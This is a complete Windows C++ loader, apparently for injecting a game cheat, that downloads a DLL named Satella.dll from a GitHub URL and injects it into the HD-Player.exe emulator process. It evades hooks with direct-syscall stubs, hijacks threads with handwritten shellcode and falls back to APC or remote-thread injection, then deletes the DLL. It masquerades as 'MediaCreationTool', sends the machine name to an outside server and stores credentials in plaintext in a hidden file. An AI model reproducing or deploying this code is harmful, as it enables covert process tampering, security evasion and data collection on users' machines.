#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <vector>
#include "ka_bridge_api.h"
#pragma comment(lib, "winhttp.lib")

#define TARGET L"HD-Player.exe"

static wchar_t g_dllPath[MAX_PATH];
static char g_log[4096];
static int g_logLen = 0;

static void Log(const char* s) {
    int n = strlen(s);
    if (g_logLen + n < sizeof(g_log) - 1) {
        memcpy(g_log + g_logLen, s, n);
        g_logLen += n;
        g_log[g_logLen] = 0;
    }
}

static void LogF(const char* fmt, ...) {
    va_list ap; va_start(ap, fmt);
    char buf[256]; vsnprintf(buf, sizeof(buf), fmt, ap);
    Log(buf); va_end(ap);
}

static void FlushLog() {
    wchar_t path[MAX_PATH];
    GetTempPathW(MAX_PATH, path);
    wcscat(path, L"satella_inject.log");
    HANDLE f = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        DWORD w; WriteFile(f, g_log, g_logLen, &w, NULL);
        CloseHandle(f);
    }
}

static void* CreateSyscall(const char* name) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return NULL;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)ntdll;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)ntdll + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)
        ((BYTE*)ntdll + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)ntdll + exp->AddressOfNames);
    WORD* ords = (WORD*)((BYTE*)ntdll + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)ntdll + exp->AddressOfFunctions);
    BYTE* stub = NULL;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (strcmp((char*)ntdll + names[i], name) == 0) { stub = (BYTE*)ntdll + funcs[ords[i]]; break; }
    }
    if (!stub) { LogF("Syscall %s not found\n", name); return NULL; }
    int scNum = -1;
    for (int i = 0; i < 32; i++) {
        if (stub[i] == 0x4C && stub[i+1] == 0x8B && stub[i+2] == 0xD1 && stub[i+3] == 0xB8) {
            scNum = *(int*)&stub[i+4]; break;
        }
        if (stub[i] == 0xB8 && stub[i+5] == 0x0F && stub[i+6] == 0x05) {
            scNum = *(int*)&stub[i+1]; break;
        }
    }
    if (scNum < 0) { LogF("Syscall num not found for %s\n", name); return NULL; }
    BYTE* code = (BYTE*)VirtualAlloc(NULL, 11, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!code) return NULL;
    code[0] = 0x4C; code[1] = 0x8B; code[2] = 0xD1;
    code[3] = 0xB8; *(int*)&code[4] = scNum;
    code[8] = 0x0F; code[9] = 0x05;
    code[10] = 0xC3;
    LogF("Syscall %s = #%d\n", name, scNum);
    return code;
}

typedef NTSTATUS(NTAPI*_NtCreateThreadEx)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,PVOID);
typedef NTSTATUS(NTAPI*_NtOpenProcess)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,struct _CLIENT_ID*);
typedef NTSTATUS(NTAPI*_NtAllocateVirtualMemory)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
typedef NTSTATUS(NTAPI*_NtWriteVirtualMemory)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
typedef NTSTATUS(NTAPI*_NtQueueApcThread)(HANDLE,PVOID,PVOID,PVOID,PVOID);
typedef NTSTATUS(NTAPI*_NtSuspendThread)(HANDLE,PULONG);
typedef NTSTATUS(NTAPI*_NtResumeThread)(HANDLE,PULONG);
typedef NTSTATUS(NTAPI*_NtGetContextThread)(HANDLE,PCONTEXT);
typedef NTSTATUS(NTAPI*_NtSetContextThread)(HANDLE,PCONTEXT);
typedef NTSTATUS(NTAPI*_NtClose)(HANDLE);
typedef NTSTATUS(NTAPI*_NtFreeVirtualMemory)(HANDLE,PVOID*,PSIZE_T,ULONG);

static _NtCreateThreadEx MyNtCreateThreadEx;
static _NtOpenProcess MyNtOpenProcess;
static _NtAllocateVirtualMemory MyNtAllocateVirtualMemory;
static _NtWriteVirtualMemory MyNtWriteVirtualMemory;
static _NtQueueApcThread MyNtQueueApcThread;
static _NtSuspendThread MyNtSuspendThread;
static _NtResumeThread MyNtResumeThread;
static _NtGetContextThread MyNtGetContextThread;
static _NtSetContextThread MyNtSetContextThread;
static _NtClose MyNtClose;
static _NtFreeVirtualMemory MyNtFreeVirtualMemory;

static void InitSyscalls() {
    Log("Init syscalls...\n");
    MyNtCreateThreadEx = (_NtCreateThreadEx)CreateSyscall("NtCreateThreadEx");
    MyNtOpenProcess = (_NtOpenProcess)CreateSyscall("NtOpenProcess");
    MyNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)CreateSyscall("NtAllocateVirtualMemory");
    MyNtWriteVirtualMemory = (_NtWriteVirtualMemory)CreateSyscall("NtWriteVirtualMemory");
    MyNtQueueApcThread = (_NtQueueApcThread)CreateSyscall("NtQueueApcThread");
    MyNtSuspendThread = (_NtSuspendThread)CreateSyscall("NtSuspendThread");
    MyNtResumeThread = (_NtResumeThread)CreateSyscall("NtResumeThread");
    MyNtGetContextThread = (_NtGetContextThread)CreateSyscall("NtGetContextThread");
    MyNtSetContextThread = (_NtSetContextThread)CreateSyscall("NtSetContextThread");
    MyNtClose = (_NtClose)CreateSyscall("NtClose");
    MyNtFreeVirtualMemory = (_NtFreeVirtualMemory)CreateSyscall("NtFreeVirtualMemory");
}

static BOOL DownloadDll() {
    wchar_t temp[MAX_PATH];
    GetTempPathW(MAX_PATH, temp);
    wcscpy(g_dllPath, temp);
    wcscat(g_dllPath, L"Satella.dll");

    LogF("Downloading Satella.dll to %S\n", g_dllPath);

    BOOL ok = FALSE;
    HINTERNET hSession = WinHttpOpen(L"Satella/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (hSession) {
        HINTERNET hConnect = WinHttpConnect(hSession, L"raw.githubusercontent.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (hConnect) {
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET",
                L"/semataryiscrazy/binallbossss/refs/heads/main/Satella.dll",
                NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
            if (hRequest) {
                if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
                    if (WinHttpReceiveResponse(hRequest, NULL)) {
                        DWORD total = 0;
                        std::vector<BYTE> buf;
                        BYTE tmp[8192];
                        DWORD read;
                        while (WinHttpReadData(hRequest, tmp, sizeof(tmp), &read)) {
                            if (read == 0) break;
                            buf.insert(buf.end(), tmp, tmp + read);
                            total += read;
                        }
                        if (total > 1000) {
                            HANDLE hFile = CreateFileW(g_dllPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                            if (hFile != INVALID_HANDLE_VALUE) {
                                DWORD w;
                                ok = WriteFile(hFile, buf.data(), (DWORD)buf.size(), &w, NULL) && w == buf.size();
                                CloseHandle(hFile);
                                LogF("Downloaded %u bytes %s\n", total, ok ? "OK" : "write FAIL");
                            } else {
                                LogF("CreateFile failed %lu\n", GetLastError());
                            }
                        } else {
                            LogF("Download too small: %u bytes\n", total);
                        }
                    }
                }
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
    return ok;
}

static DWORD FindPid() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) do {
        if (lstrcmpiW(pe.szExeFile, TARGET) == 0) { pid = pe.th32ProcessID; break; }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return pid;
}

static HANDLE TryOpen(DWORD pid, ACCESS_MASK mask, const char* method) {
    // Try syscall first
    if (MyNtOpenProcess) {
        OBJECT_ATTRIBUTES oa = { sizeof(oa) };
        CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid, NULL };
        HANDLE hp = NULL;
        NTSTATUS st = MyNtOpenProcess(&hp, mask, &oa, &cid);
        if (st >= 0 && hp) { LogF("%s: syscall opened handle\n", method); return hp; }
        LogF("%s: syscall OpenProcess failed 0x%lx\n", method, st);
    }
    HANDLE hp2 = OpenProcess(mask, FALSE, pid);
    if (hp2) { LogF("%s: Win32 opened handle\n", method); return hp2; }
    LogF("%s: Win32 OpenProcess failed %lu\n", method, GetLastError());
    return NULL;
}

static BOOL InjectHijack(DWORD pid) {
    Log("\n=== Method 1: Thread Hijack ===\n");
    if (!MyNtSuspendThread || !MyNtGetContextThread || !MyNtSetContextThread || !MyNtResumeThread) {
        Log("Missing syscalls\n"); return FALSE;
    }

    HANDLE hp = TryOpen(pid, PROCESS_ALL_ACCESS, "Hijack");
    if (!hp) return FALSE;

    SIZE_T scSize = 0x400;
    LPVOID scMem = NULL;
    NTSTATUS st = MyNtAllocateVirtualMemory ? 
        MyNtAllocateVirtualMemory(hp, &scMem, 0, &scSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) : -1;
    if (st < 0)
        scMem = VirtualAllocEx(hp, NULL, 0x400, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!scMem) { Log("Alloc shellcode mem failed\n"); MyNtClose(hp); return FALSE; }
    LogF("Shellcode at %p\n", scMem);

    ULONGLONG ldrAddr = (ULONGLONG)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "LdrLoadDll");
    LogF("LdrLoadDll at %llx\n", ldrAddr);

    SIZE_T pathSz = (wcslen(g_dllPath) + 1) * sizeof(wchar_t);
    if (MyNtWriteVirtualMemory) {
        MyNtWriteVirtualMemory(hp, (BYTE*)scMem + 0x100, &ldrAddr, 8, NULL);
        MyNtWriteVirtualMemory(hp, (BYTE*)scMem + 0x108, g_dllPath, pathSz, NULL);
    } else {
        WriteProcessMemory(hp, (BYTE*)scMem + 0x100, &ldrAddr, 8, NULL);
        WriteProcessMemory(hp, (BYTE*)scMem + 0x108, g_dllPath, pathSz, NULL);
    }

    UNICODE_STRING us;
    us.Length = (USHORT)(pathSz - sizeof(wchar_t));
    us.MaximumLength = (USHORT)pathSz;
    us.Buffer = (PWCH)((BYTE*)scMem + 0x108);
    if (MyNtWriteVirtualMemory)
        MyNtWriteVirtualMemory(hp, (BYTE*)scMem + 0x300, &us, sizeof(us), NULL);
    else
        WriteProcessMemory(hp, (BYTE*)scMem + 0x300, &us, sizeof(us), NULL);

    ULONGLONG zero = 0;
    if (MyNtWriteVirtualMemory)
        MyNtWriteVirtualMemory(hp, (BYTE*)scMem + 0x310, &zero, 8, NULL);
    else
        WriteProcessMemory(hp, (BYTE*)scMem + 0x310, &zero, 8, NULL);

    BYTE sc[] = {
        0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x9C,
        0x48,0x83,0xEC,0x28,
        0x48,0xB9,0,0,0,0,0,0,0,0, 0x33,0xD2,
        0x49,0xB8,0,0,0,0,0,0,0,0, 0x45,0x33,0xC9,
        0x48,0xB8,0,0,0,0,0,0,0,0, 0xFF,0xD0,
        0x48,0x83,0xC4,0x28,0x9D,
        0x5F,0x5E,0x5D,0x5C,0x5B,0x5A,0x59,0x58,0xC3
    };
    *(ULONGLONG*)&sc[16] = (ULONGLONG)(BYTE*)scMem + 0x300;
    *(ULONGLONG*)&sc[29] = (ULONGLONG)(BYTE*)scMem + 0x310;
    *(ULONGLONG*)&sc[42] = ldrAddr;
    if (MyNtWriteVirtualMemory)
        MyNtWriteVirtualMemory(hp, scMem, sc, sizeof(sc), NULL);
    else
        WriteProcessMemory(hp, scMem, sc, sizeof(sc), NULL);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    BOOL ok = FALSE;
    if (snap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te = { sizeof(te) };
        int tried = 0;
        if (Thread32First(snap, &te)) do {
            if (te.th32OwnerProcessID != pid) continue;
            tried++;
            HANDLE ht = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
            if (!ht) { LogF("OpenThread(%lu) failed %lu\n", te.th32ThreadID, GetLastError()); continue; }
            st = MyNtSuspendThread(ht, NULL);
            if (st < 0) { LogF("SuspendThread(%lu) failed 0x%lx\n", te.th32ThreadID, st); CloseHandle(ht); continue; }
            CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL;
            st = MyNtGetContextThread(ht, &ctx);
            if (st < 0) { LogF("GetContext failed 0x%lx\n", st); MyNtResumeThread(ht, NULL); CloseHandle(ht); continue; }
            ctx.Rsp -= 8;
            if (MyNtWriteVirtualMemory)
                MyNtWriteVirtualMemory(hp, (LPVOID)ctx.Rsp, &ctx.Rip, 8, NULL);
            else
                WriteProcessMemory(hp, (LPVOID)ctx.Rsp, &ctx.Rip, 8, NULL);
            ctx.Rip = (ULONGLONG)scMem;
            ctx.ContextFlags = CONTEXT_FULL;
            st = MyNtSetContextThread(ht, &ctx);
            if (st >= 0) {
                LogF("Hijacked thread %lu!\n", te.th32ThreadID);
                MyNtResumeThread(ht, NULL);
                ok = TRUE; CloseHandle(ht); break;
            }
            LogF("SetContext failed 0x%lx\n", st);
            MyNtResumeThread(ht, NULL);
            CloseHandle(ht);
        } while (Thread32Next(snap, &te));
        LogF("Tried %d threads\n", tried);
        CloseHandle(snap);
    }
    if (!ok) { SIZE_T sz = 0; MyNtFreeVirtualMemory(hp, &scMem, &sz, MEM_RELEASE); }
    MyNtClose(hp);
    LogF("Hijack result: %d\n", ok);
    return ok;
}

static BOOL InjectAPC(DWORD pid) {
    Log("\n=== Method 2: APC ===\n");
    HANDLE hp = TryOpen(pid, PROCESS_ALL_ACCESS, "APC");
    if (!hp) return FALSE;

    SIZE_T sz = (wcslen(g_dllPath) + 1) * sizeof(wchar_t);
    LPVOID mem = NULL;
    NTSTATUS st = MyNtAllocateVirtualMemory ?
        MyNtAllocateVirtualMemory(hp, &mem, 0, &sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) : -1;
    if (st < 0) mem = VirtualAllocEx(hp, NULL, sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { Log("Alloc mem failed\n"); MyNtClose(hp); return FALSE; }

    if (MyNtWriteVirtualMemory)
        MyNtWriteVirtualMemory(hp, mem, g_dllPath, sz, NULL);
    else
        WriteProcessMemory(hp, mem, g_dllPath, sz, NULL);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    BOOL ok = FALSE;
    int queued = 0;
    if (snap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te = { sizeof(te) };
        if (Thread32First(snap, &te)) do {
            if (te.th32OwnerProcessID != pid) continue;
            HANDLE ht = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
            if (!ht) continue;
            st = MyNtQueueApcThread ? MyNtQueueApcThread(ht, LoadLibraryW, mem, NULL, NULL) : -1;
            if (st >= 0) { queued++; ok = TRUE; }
            MyNtClose(ht);
        } while (Thread32Next(snap, &te));
        CloseHandle(snap);
    }
    LogF("APC queued on %d threads\n", queued);
    MyNtClose(hp);
    LogF("APC result: %d\n", ok);
    return ok;
}

static BOOL InjectCreateThread(DWORD pid) {
    Log("\n=== Method 3: CreateRemoteThread ===\n");
    HANDLE hp = TryOpen(pid, PROCESS_ALL_ACCESS, "CRT");
    if (!hp) return FALSE;

    SIZE_T sz = (wcslen(g_dllPath) + 1) * sizeof(wchar_t);
    LPVOID mem = NULL;
    NTSTATUS st = MyNtAllocateVirtualMemory ?
        MyNtAllocateVirtualMemory(hp, &mem, 0, &sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) : -1;
    if (st < 0) mem = VirtualAllocEx(hp, NULL, sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { Log("Alloc mem failed\n"); MyNtClose(hp); return FALSE; }

    if (MyNtWriteVirtualMemory)
        MyNtWriteVirtualMemory(hp, mem, g_dllPath, sz, NULL);
    else
        WriteProcessMemory(hp, mem, g_dllPath, sz, NULL);

    HANDLE hT = NULL;
    st = MyNtCreateThreadEx ? MyNtCreateThreadEx(&hT, THREAD_ALL_ACCESS, NULL, hp, LoadLibraryW, mem, 0, 0, 0, NULL) : -1;
    if (st >= 0 && hT) {
        WaitForSingleObject(hT, 5000);
        MyNtClose(hT); MyNtClose(hp);
        Log("CRT via syscall OK\n");
        return TRUE;
    }
    LogF("Syscall CRT failed 0x%lx\n", st);

    hT = CreateRemoteThread(hp, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryW, mem, 0, NULL);
    if (hT) {
        WaitForSingleObject(hT, 5000);
        CloseHandle(hT); CloseHandle(hp);
        Log("CRT via Win32 OK\n");
        return TRUE;
    }
    LogF("Win32 CRT failed %lu\n", GetLastError());
    MyNtClose(hp);
    return FALSE;
}

static BOOL InjectWin32(DWORD pid) {
    Log("\n=== Method 4: Win32 All ===\n");
    HANDLE hp = TryOpen(pid, PROCESS_ALL_ACCESS, "Win32");
    if (!hp) {
        // Try minimal rights
        hp = TryOpen(pid, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, "Win32-min");
        if (!hp) return FALSE;
    }

    SIZE_T sz = (wcslen(g_dllPath) + 1) * sizeof(wchar_t);
    LPVOID mem = VirtualAllocEx(hp, NULL, sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { LogF("VirtualAllocEx failed %lu\n", GetLastError()); CloseHandle(hp); return FALSE; }
    WriteProcessMemory(hp, mem, g_dllPath, sz, NULL);
    Log("Remote memory written\n");

    int apcOk = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te = { sizeof(te) };
        if (Thread32First(snap, &te)) do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE ht = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                if (ht) { if (QueueUserAPC((PAPCFUNC)LoadLibraryW, ht, (ULONG_PTR)mem)) apcOk++; CloseHandle(ht); }
            }
        } while (Thread32Next(snap, &te));
        CloseHandle(snap);
    }
    LogF("APC queued on %d threads\n", apcOk);

    HANDLE hT = CreateRemoteThread(hp, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryW, mem, 0, NULL);
    if (hT) {
        WaitForSingleObject(hT, 5000);
        CloseHandle(hT); CloseHandle(hp);
        Log("Win32 CRT OK\n");
        return TRUE;
    }
    LogF("Win32 CRT failed %lu\n", GetLastError());
    CloseHandle(hp);
    return FALSE;
}

static void NotifyApi() {
    wchar_t computerName[64];
    DWORD sz = 64;
    if (!GetComputerNameW(computerName, &sz)) wcscpy(computerName, L"Unknown");

    char hostA[64];
    wcstombs(hostA, computerName, 63);

    char body[256];
    sprintf_s(body, "{\"username\":\"%s\"}", hostA);

    HINTERNET hSession = WinHttpOpen(L"MediaCreationTool/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (hSession) {
        HINTERNET hConnect = WinHttpConnect(hSession, L"satella-auth-bot.onrender.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (hConnect) {
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/notify_download",
                NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
            if (hRequest) {
                LPCWSTR hdrs = L"Content-Type: application/json\r\n";
                if (WinHttpSendRequest(hRequest, hdrs, (DWORD)wcslen(hdrs),
                    (LPVOID)body, (DWORD)strlen(body), (DWORD)strlen(body), 0)) {
                    WinHttpReceiveResponse(hRequest, NULL);
                }
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
    LogF("Notified API: %s\n", hostA);
}

static int AuthFromCredFile() {
    wchar_t credPath[MAX_PATH];
    GetTempPathW(MAX_PATH, credPath);
    wcscat(credPath, L"Satella.cred");
    HANDLE cf = CreateFileW(credPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (cf == INVALID_HANDLE_VALUE) return 0;
    DWORD rd; wchar_t raw[128] = {};
    ReadFile(cf, raw, sizeof(raw) - 2, &rd, NULL); CloseHandle(cf);
    wchar_t* sep = wcschr(raw, L'|'); if (!sep) return 0;
    sep[0] = 0; char u[64] = {}, pwd[64] = {};
    wcstombs(u, raw, 63); wcstombs(pwd, sep + 1, 63);
    ka_init();
    return ka_login(u, pwd);
}

static void SaveCredFile(const char* u, const char* pwd) {
    wchar_t path[MAX_PATH];
    GetTempPathW(MAX_PATH, path); wcscat(path, L"Satella.cred");
    HANDLE f = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        wchar_t buf[128]; wsprintfW(buf, L"%hs|%hs", u, pwd);
        DWORD wb; WriteFile(f, buf, (wcslen(buf) * 2 + 2), &wb, NULL);
        CloseHandle(f);
    }
}

static void DeleteDll() {
    if (g_dllPath[0]) {
        DeleteFileW(g_dllPath);
        LogF("Deleted DLL: %S\n", g_dllPath);
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    Log("=== Satella MediaCreationTool ===\n");
    InitSyscalls();

    // Auth: try saved creds or command line args
    int authed = AuthFromCredFile();
    if (!authed && lpCmd && lpCmd[0]) {
        char args[256]; strcpy_s(args, sizeof(args), lpCmd);
        char* u = args;
        char* pwd = strchr(args, ' ');
        if (pwd) {
            *pwd++ = 0;
            char* key = strchr(pwd, ' ');
            if (key) {
                *key++ = 0;
                ka_init();
                authed = ka_register(u, pwd, key);
                if (authed) SaveCredFile(u, pwd);
            } else {
                ka_init();
                authed = ka_login(u, pwd);
                if (authed) SaveCredFile(u, pwd);
            }
        }
    }
    LogF("Auth: %d\n", authed);

    if (!DownloadDll()) { Log("Download failed\n"); FlushLog(); return 1; }
    if (authed) NotifyApi();
    LogF("DLL path: %S\n", g_dllPath);

    Log("Waiting for HD-Player.exe...\n");
    DWORD pid = 0;
    int waited = 0;
    while ((pid = FindPid()) == 0) {
        Sleep(2000); waited++;
        if (waited % 15 == 0) LogF("Still waiting... (%d min)\n", waited / 30);
    }
    LogF("Found HD-Player.exe PID: %lu\n", pid);

    BOOL injected = FALSE;
    if (InjectCreateThread(pid)) { Log("=== INJECTED via CRT ===\n"); injected = TRUE; }
    else if (InjectWin32(pid)) { Log("=== INJECTED via Win32 ===\n"); injected = TRUE; }
    else if (InjectAPC(pid)) { Log("=== INJECTED via APC ===\n"); injected = TRUE; }
    else { Log("=== ALL METHODS FAILED ===\n"); }
    
    if (injected) DeleteDll();
    FlushLog();
    return 0;
}
